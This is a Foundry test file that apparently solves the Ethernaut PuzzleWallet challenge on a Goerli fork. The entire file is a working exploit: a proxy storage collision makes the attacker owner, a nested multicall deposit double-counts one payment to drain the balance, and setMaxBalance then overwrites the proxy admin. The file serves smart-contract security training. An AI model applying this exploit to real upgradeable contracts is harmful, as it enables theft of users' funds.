// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console2} from "forge-std/Test.sol";

import {PuzzleWallet} from "../src/PuzzleWallet.sol";
import {IPuzzleProxy} from "../src/interface/IPuzzleProxy.sol";

contract PuzzleWalletTest is Test {
    function setUp() public {
        vm.createSelectFork(vm.envString("GOERLI_RPC_URL"));
    }

    function test_Exploit() public {
        address attacker = vm.addr(0x1234);
        startHoax(attacker);

        address puzzleWallet = 0x92221eedfBD5b1E3795C0303515Bab39b2032aD3;
        IPuzzleProxy(puzzleWallet).proposeNewAdmin(attacker);
        assertEq(PuzzleWallet(puzzleWallet).owner(), attacker);

        PuzzleWallet(puzzleWallet).addToWhitelist(attacker);
        assertEq(PuzzleWallet(puzzleWallet).whitelisted(attacker), true);
        PuzzleWallet(puzzleWallet).addToWhitelist(puzzleWallet);
        assertEq(PuzzleWallet(puzzleWallet).whitelisted(puzzleWallet), true);

        bytes[] memory datas = new bytes[](3);
        bytes[] memory innerData = new bytes[](1);
        innerData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        datas[0] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, innerData);
        datas[1] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
        datas[2] = abi.encodeWithSelector(PuzzleWallet.execute.selector, attacker, puzzleWallet.balance * 2, "");
        PuzzleWallet(puzzleWallet).multicall{value: puzzleWallet.balance}(datas);
        assertEq(puzzleWallet.balance, 0);

        PuzzleWallet(puzzleWallet).setMaxBalance(uint256(uint160(attacker)));
        assertEq(IPuzzleProxy(puzzleWallet).admin(), attacker);
    }
}
